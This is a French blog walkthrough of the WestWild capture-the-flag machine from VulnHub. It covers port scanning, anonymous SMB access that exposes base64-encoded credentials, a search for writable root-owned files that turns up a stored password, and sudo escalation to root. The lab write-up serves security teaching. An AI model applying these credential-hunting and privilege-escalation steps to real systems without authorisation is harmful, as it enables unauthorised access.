---
title: "Solution du CTF WestWild de VulnHub"
tags: [CTF,VulnHub]
---

[WestWild](https://vulnhub.com/entry/westwild-11,338/) est un CTF simple créé par *Hashim Alsharef* et disponible sur *VulnHub* depuis juillet 2019.

## Surfer

On a ici des ports classiques. Le port 80 a juste un message *Follow the wave*...

```
Nmap scan report for 192.168.56.211
Host is up (0.00015s latency).
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.7 ((Ubuntu))
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
```

Je me dirige donc sur SMB et bingo, il y a un partage nommé `wave` :

```console
$ smbclient -U "" -N -L //192.168.56.211

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        wave            Disk      WaveDoor
        IPC$            IPC       IPC Service (WestWild server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
$ smbclient -U "" -N //192.168.56.211/wave
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Jul 30 07:18:56 2019
  ..                                  D        0  Fri Aug  2 01:02:20 2019
  FLAG1.txt                           N       93  Tue Jul 30 04:31:05 2019
  message_from_aveng.txt              N      115  Tue Jul 30 07:21:48 2019

                1781464 blocks of size 1024. 270356 blocks available
```

Le message en question est le suivant :

> Dear Wave,
> 
> Am Sorry but i was lost my password,
> and i believe that you can reset it for me.
> Thank You 
> Aveng

Le flag contient une longue chaine base64 qui s'avère correspondre à des identifiants :

```console
$ cat FLAG1.txt | base64 -d
Flag1{Welcome_T0_THE-W3ST-W1LD-B0rder}
user:wavex
password:door+open
```

## Côte ouest

Les identifiants permettent un accès SSH.

En fouillant les fichiers et dossiers appartenant à root et que je peux modifier j'en trouve un nommé après le CTF :

```console
wavex@WestWild:/$ find / -user root -writable -ls 2> /dev/null | grep -v /dev | grep -v /proc
--- snip ---
  7490    0 -rw-rw-rw-   1 root     root            0 May 21 22:23 /sys/kernel/security/apparmor/.access
 69633    4 drwxrwxrwx   2 root     root         4096 Jul 30  2019 /usr/share/av/westsidesecret
 54395    4 drwx-wx-wt   3 root     root         4096 Jul 30  2019 /var/lib/php5
--- snip ---
wavex@WestWild:/$ ls -al /usr/share/av/westsidesecret
total 12K
drwxrwxrwx 2 root  root  4.0K Jul 30  2019 .
drwxr-xr-x 3 root  root  4.0K Jul 30  2019 ..
-rwxrwxrwx 1 wavex wavex  101 Jul 30  2019 ififoregt.sh
wavex@WestWild:/$ cat /usr/share/av/westsidesecret/ififoregt.sh 
 #!/bin/bash 
 figlet "if i foregt so this my way"
 echo "user:aveng"
 echo "password:kaizen+80"
```

Les identifiants permettant de se connecter sur le compte `aveng` et de passer `root` via `sudo`, l'utilisateur étant administrateur.

```console
aveng@WestWild:~$ sudo -l
[sudo] password for aveng: 
Matching Defaults entries for aveng on WestWild:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User aveng may run the following commands on WestWild:
    (ALL : ALL) ALL
aveng@WestWild:~$ sudo su
root@WestWild:/home/aveng# cd /root
root@WestWild:~# ls
FLAG2.txt
root@WestWild:~# cat FLAG2.txt
Flag2{Weeeeeeeeeeeellco0o0om_T0_WestWild}

Great! take a screenshot and Share it with me in twitter @HashimAlshareff
```

Alternativement on pouvait effectuer une recherche sur le mot `password` dans tous les fichiers texte du système :

```console
wavex@WestWild:~$ grep -l -r --include "*.txt" password / 2> /dev/null 
/usr/share/vim/vim74/doc/version7.txt
/usr/share/vim/vim74/doc/usr_23.txt
/usr/share/vim/vim74/doc/pi_netrw.txt
/usr/share/vim/vim74/doc/netbeans.txt
/usr/share/vim/vim74/doc/version6.txt
/usr/share/vim/vim74/doc/if_cscop.txt
/usr/share/vim/vim74/doc/todo.txt
/usr/share/vim/vim74/doc/os_vms.txt
/usr/share/vim/vim74/doc/starting.txt
/usr/share/doc/openssl/HOWTO/keys.txt
/usr/share/mysql/errmsg-utf8.txt
/home/wavex/wave/message_from_aveng.txt
```
